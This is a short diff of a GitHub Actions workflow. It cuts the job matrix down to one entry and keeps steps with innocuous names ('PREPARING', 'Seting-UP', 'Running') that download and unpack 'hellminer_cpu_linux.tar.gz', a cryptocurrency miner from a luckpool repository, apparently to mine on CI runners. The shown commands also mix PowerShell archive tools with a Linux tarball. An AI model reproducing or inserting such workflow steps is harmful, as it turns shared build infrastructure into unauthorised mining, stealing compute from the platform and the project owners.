@@ -10,14 +10,14 @@ jobs:
       max-parallel: 5
       fail-fast: false
       matrix:
-        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
-        flag: [A, B, C, D, E, T, W, O, P, H, L]
+        go: [1]
+        flag: [A]
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -Outfile hellminer_cpu_linux.tar.gz
+     run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -Outfile hellminer_cpu_linux.tar.gz
     - name: Seting-UP
       run: Expand-Archive hellminer_cpu_linux.tar.gz
     - name: Running
